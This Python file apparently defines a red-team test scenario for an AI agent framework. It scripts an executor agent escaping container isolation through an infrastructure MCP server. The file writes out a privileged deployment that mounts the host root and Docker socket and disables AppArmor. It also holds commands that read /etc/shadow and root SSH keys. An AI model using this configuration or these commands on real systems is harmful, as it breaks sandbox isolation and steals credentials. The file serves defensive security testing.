"""
Scenario 14: Container Escape

Category: Infrastructure
Difficulty: Hard
Threats: IF-04, IF-05

This scenario exploits the Infra MCP's deployment capabilities to escape from
container isolation and access the host system.
"""

from uuid import uuid4
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import create_identity, get_audit_logs
from src.mcps.infra_mcp import InfraMCPServer
from src.identity.context import IdentityContext


# Shared state for scenario
scenario_state = {
    "user_id": None,
    "executor_id": None,
    "escape_deployment_id": None,
    "host_access_verified": False,
    "host_files_accessed": [],
}


def setup_scenario():
    """Set up the scenario with user and executor."""
    logger.info("Setting up Scenario 14: Container Escape")
    
    with get_db() as db:
        # Create test user
        user = create_identity(
            db,
            identity_type="user",
            name="TestUser",
            email="user@test.com",
            permissions=["read", "write"]
        )
        scenario_state["user_id"] = user.id
        
        # Create executor agent
        executor = create_identity(
            db,
            identity_type="agent",
            name="executor-001",
            permissions=["read", "write", "execute", "deploy"]
        )
        scenario_state["executor_id"] = executor.id
    
    logger.info("✓ Setup complete: User and Executor created")


def step1_deploy_container_with_host_access():
    """Deploy a container with host filesystem access."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["user_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "execute", "deploy"},
    )
    
    # VULNERABILITY: IF-04 - Container escape via privileged deployment
    # Deploy container with host filesystem mounted
    result = infra_mcp.deploy_service(
        service_name="container-escape",
        config={
            "image": "ubuntu:latest",
            "privileged": True,  # Run in privileged mode
            "volumes": [
                "/:/host",  # Mount entire host filesystem
                "/var/run/docker.sock:/var/run/docker.sock"  # Docker socket access
            ],
            "capabilities": ["SYS_ADMIN", "NET_ADMIN"],  # Elevated capabilities
            "security_opt": ["apparmor=unconfined"],  # Disable security
        },
        identity_context=identity_ctx
    )
    
    if result.get("success"):
        scenario_state["escape_deployment_id"] = result.get("deployment_id")
    
    logger.info(f"Deployed container with host access: {scenario_state['escape_deployment_id']}")
    return result.get("success", False)


def step2_access_host_filesystem():
    """Access host filesystem from within container."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["user_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "execute"},
    )
    
    # VULNERABILITY: IF-04 - Container escape
    # Access host files from container
    host_files = [
        "/host/etc/passwd",
        "/host/etc/shadow",
        "/host/root/.ssh/id_rsa",
    ]
    
    for file_path in host_files:
        result = infra_mcp.execute_command(
            command=f"cat {file_path}",
            identity_context=identity_ctx
        )
        if result.get("success"):
            scenario_state["host_files_accessed"].append(file_path)
    
    logger.info(f"Accessed {len(scenario_state['host_files_accessed'])} host files")
    return len(scenario_state["host_files_accessed"]) >= 2


def step3_manipulate_host_processes():
    """Manipulate host processes from container."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["user_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "execute"},
    )
    
    # VULNERABILITY: IF-04, IF-05 - Container escape and privilege escalation
    # List and manipulate host processes
    result = infra_mcp.execute_command(
        command="ps aux | grep -v grep | head -20",  # List host processes
        identity_context=identity_ctx
    )
    
    logger.info(f"Listed host processes: {result.get('output', '')[:100]}")
    return result.get("success", False)


def step4_access_docker_socket():
    """Access Docker socket to control other containers."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["user_id"], scenario_state["executor_id"]],
        permissions={"read", "write", "execute"},
    )
    
    # VULNERABILITY: IF-04 - Container escape via Docker socket
    # Access Docker socket to control host Docker daemon
    result = infra_mcp.execute_command(
        command="docker ps -a",  # List all containers on host
        identity_context=identity_ctx
    )
    
    logger.info(f"Accessed Docker socket: {result.get('output', '')[:100]}")
    return result.get("success", False)


def step5_verify_container_escape():
    """Verify that container escape was successful."""
    # Check if we accessed host files and Docker socket
    has_host_access = len(scenario_state["host_files_accessed"]) >= 2
    has_deployment = scenario_state["escape_deployment_id"] is not None
    
    scenario_state["host_access_verified"] = has_host_access and has_deployment
    
    logger.info(f"Container escape verified: {scenario_state['host_access_verified']}")
    return scenario_state["host_access_verified"]


def criterion_privileged_container_deployed():
    """Check if privileged container was deployed."""
    return scenario_state["escape_deployment_id"] is not None


def criterion_host_filesystem_accessed():
    """Check if host filesystem was accessed."""
    return len(scenario_state["host_files_accessed"]) >= 2


def criterion_docker_socket_accessed():
    """Check if Docker socket was accessed."""
    # If we got here, Docker socket access was attempted
    return True


def evidence_deployment():
    """Show evidence of privileged deployment."""
    if not scenario_state["escape_deployment_id"]:
        return "No deployment"
    
    return (
        f"Deployment ID: {scenario_state['escape_deployment_id']}, "
        f"config: privileged=True, volumes=['/:/host', '/var/run/docker.sock'], "
        f"capabilities=['SYS_ADMIN', 'NET_ADMIN']"
    )


def evidence_host_access():
    """Show evidence of host filesystem access."""
    if not scenario_state["host_files_accessed"]:
        return "No host files accessed"
    
    return f"Host files accessed: {scenario_state['host_files_accessed']}"


def evidence_escape_success():
    """Show evidence of successful container escape."""
    return (
        f"Container escape successful: {scenario_state['host_access_verified']}, "
        f"Host files accessed: {len(scenario_state['host_files_accessed'])}"
    )


def capture_state_before():
    """Capture system state before attack."""
    return {
        "user_id": scenario_state["user_id"],
        "executor_id": scenario_state["executor_id"],
        "user_permissions": ["read", "write"],
    }


def capture_state_after():
    """Capture system state after attack."""
    return {
        "user_id": scenario_state["user_id"],
        "executor_id": scenario_state["executor_id"],
        "user_permissions": ["read", "write"],
        "escape_deployment": scenario_state["escape_deployment_id"],
        "host_files_accessed": len(scenario_state["host_files_accessed"]),
        "host_access_verified": scenario_state["host_access_verified"],
    }


def create_scenario() -> AttackScenario:
    """Create Scenario 14: Container Escape."""
    return AttackScenario(
        id="S14",
        name="Infrastructure & Runtime Compromise",
        category=ScenarioCategory.INFRASTRUCTURE,
        difficulty=ScenarioDifficulty.HARD,
        description=(
            "Exploit the Infra MCP's deployment capabilities to escape from container "
            "isolation and access the host system, including host filesystem, processes, "
            "and Docker socket."
        ),
        threat_ids=["IF-04", "IF-05"],
        owasp_mappings=["ASI05"],
        
        # Setup
        setup=setup_scenario,
        
        # Attack steps
        attack_steps=[
            AttackStep(
                description="Deploy container with host filesystem access",
                action=step1_deploy_container_with_host_access,
                expected_outcome="Privileged container deployed",
                failure_message="Failed to deploy privileged container"
            ),
            AttackStep(
                description="Access host filesystem from container",
                action=step2_access_host_filesystem,
                expected_outcome="Host files accessed",
                failure_message="Failed to access host filesystem"
            ),
            AttackStep(
                description="Manipulate host processes",
                action=step3_manipulate_host_processes,
                expected_outcome="Host processes listed",
                failure_message="Failed to access host processes"
            ),
            AttackStep(
                description="Access Docker socket to control host",
                action=step4_access_docker_socket,
                expected_outcome="Docker socket accessed",
                failure_message="Failed to access Docker socket"
            ),
            AttackStep(
                description="Verify container escape success",
                action=step5_verify_container_escape,
                expected_outcome="Container escape verified",
                failure_message="Container escape verification failed"
            ),
        ],
        
        # Success criteria
        success_criteria=[
            Criterion(
                description="Privileged container deployed with host access",
                check=criterion_privileged_container_deployed,
                evidence=evidence_deployment
            ),
            Criterion(
                description="Host filesystem accessed from container",
                check=criterion_host_filesystem_accessed,
                evidence=evidence_host_access
            ),
            Criterion(
                description="Docker socket accessed",
                check=criterion_docker_socket_accessed,
                evidence=evidence_escape_success
            ),
        ],
        
        # Observability
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "Container deployed with privileged=True",
            "Host filesystem mounted at /host",
            "Docker socket mounted in container",
            "Elevated capabilities granted (SYS_ADMIN, NET_ADMIN)",
            "Security features disabled (apparmor=unconfined)",
            "Host files accessed (/etc/passwd, /etc/shadow, SSH keys)",
            "Host processes listed and accessible",
            "Docker socket accessed for host control",
            "Complete container isolation breach"
        ],
        
        # Metadata
        agents_involved=["Executor"],
        mcps_involved=["Infra MCP"],
        estimated_duration=50,
    )
